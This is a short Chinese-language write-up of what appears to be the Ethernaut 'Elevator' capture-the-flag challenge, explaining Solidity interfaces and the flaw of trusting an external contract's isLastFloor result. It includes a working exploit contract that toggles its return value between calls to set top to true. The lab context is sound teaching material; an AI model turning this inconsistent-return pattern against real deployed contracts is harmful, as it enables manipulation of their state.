### 题目

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/677dd1ae4bf94a3893450742c3b503a5~tplv-k3u1fbpfcp-watermark.image?)

目标是让top变成true

### 分析：
`top` 变量在`building.isLastFloor(_floor)`为`false`时才会被赋值，因此在正常情况下，top 好像永远不会为 `true`  
那么我们就得让isLastFloor方法两次使用的时候值不一样，因此我们可以重写isLastFloor。

这里的问题是把操作交给了外部合约，调用的是外部合约里的方法，但是外部合约不可信。

**接口：**  
接口类似于抽象合约，使用`interface`关键字创建，接口只能包含抽象函数，不能包含函数实现。以下是接口的关键特性：

-   接口的函数只能是外部类型。
-   接口不能有构造函数。
-   接口不能有状态变量。
-   接口可以包含enum、struct定义，可以使用`interface_name.`访问它们。

### 解答：
> 
> contract building{  
>      Elevator elevator ;
>      
>      bool  public sign =false;
>      function goTofloor()public{
>        elevator=Elevator(0xB55F1ea35AFd58aa006ec0C7296462Abdbd2d46D);
>        elevator.goTo(10);
>      }
>      function isLastFloor(uint)external returns (bool){
>        sign=!sign;
>        return sign;
> 
>      }
> }
> 